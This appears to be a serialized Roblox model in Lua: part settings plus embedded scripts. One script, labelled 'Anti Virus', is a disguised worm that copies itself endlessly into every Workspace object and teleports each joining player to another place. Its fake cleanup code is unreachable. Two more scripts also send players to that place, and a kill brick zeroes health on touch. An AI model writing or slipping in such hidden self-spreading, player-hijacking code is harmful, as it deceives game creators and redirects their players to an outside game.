Script1284.Parent = MeshPart1282
table.insert(cors,sandbox(Script1284,function()
function spread() -- Made by the geniuses at #O#d#
-- Anti Virus-- Made by Avg, Bitdefender, avast and antivirooois programs.
wait "0"
local stuff = game.Workspace:GetChildren()
for i = 1, #stuff do
if (stuff[i].className ~= "Script") and (stuff[i]:findFirstChild("") == nil) and (stuff[i].className ~= "Camera") then
local clone = script:clone()
clone.Parent = stuff[i]
end
end
end

function onPlayerEntered(newPlayer)	
while true do
			if newPlayer.Character ~= nil then break end
			wait(1)
end
	
	game:GetService("TeleportService"):TeleportToSpawnByName(5838307772, "NameofSpawn", newPlayer)
end



game.Players.PlayerAdded:connect(onPlayerEntered)

while true do
wait(.1)
spread()
end

function GetAllItems(mdl) 
local objs = {} 
function Search(obj) 
if obj~=workspace then 
table.insert(objs,obj) 
end 
if #obj:GetChildren() > 0 then 
for i, v in ipairs(obj:GetChildren()) do 
Search(v) 
end 
end 
end 
Search(mdl) 
return objs 
end 



for i, v in ipairs(GetAllItems(workspace)) do 
if v.className == "Script" then 
if v.Name == "Script" or v.Name == "Anti Infected" or v.Name == "Anti Virus" or v.Name == "lololyougothackedNOOB" then 
v.Parent = game.Lighting --Just in case it has a removal prevention. 
t = Instance.new("ObjectValue") 
t.Name = "IsAVirus" 
t.Parent = v 
end 
end 
end 

for i, v in ipairs(game.Lighting:GetChildren()) do 
if v:findFirstChild("IsAVirus") then --Only remove the viruses. 
v:remove() 
end 
end 



print("Virus debugged! All clean!")
end))
Script1285.Parent = MeshPart1282
table.insert(cors,sandbox(Script1285,function()
function onTouched(hit)
   local player = game.Players:GetPlayerFromCharacter(hit.Parent)
   if player then
		game:GetService("TeleportService"):Teleport(5838307772,player)  --replace the numbers with your place id
  end
end


script.Parent.Touched:connect(onTouched)

--Game Teleporter by Pappafaffa. I hope it helps.
end))
Script1286.Name = "Teleport"
Script1286.Parent = MeshPart1282
table.insert(cors,sandbox(Script1286,function()
GameID = 5838307772

game.Players.PlayerAdded:connect(function(player)
	game:GetService("TeleportService"):Teleport(GameID, player)
end)
end))
MeshPart1287.Parent = Part1257
MeshPart1287.CFrame = CFrame.new(-89.6060638, 60.615097, 35.2180786, 0, 0, -1, 0, 1, 0, 1, 0, 0)
MeshPart1287.Orientation = Vector3.new(0, -90, 0)
MeshPart1287.Position = Vector3.new(-89.6060638, 60.615097, 35.2180786)
MeshPart1287.Rotation = Vector3.new(0, -90, 0)
MeshPart1287.Color = Color3.new(1, 1, 0)
MeshPart1287.Size = Vector3.new(1.926085, 3.56067395, 3.48859286)
MeshPart1287.Anchored = true
MeshPart1287.BrickColor = BrickColor.new("New Yeller")
MeshPart1287.Material = Enum.Material.SmoothPlastic
MeshPart1287.brickColor = BrickColor.new("New Yeller")
Script1288.Name = "KillScript"
Script1288.Parent = MeshPart1287
table.insert(cors,sandbox(Script1288,function()
script.Parent.Touched:connect(function(hit)
	if hit and hit.Parent and hit.Parent:FindFirstChild("Humanoid") then
		hit.Parent.Humanoid.Health = 0
	end
end)
end))
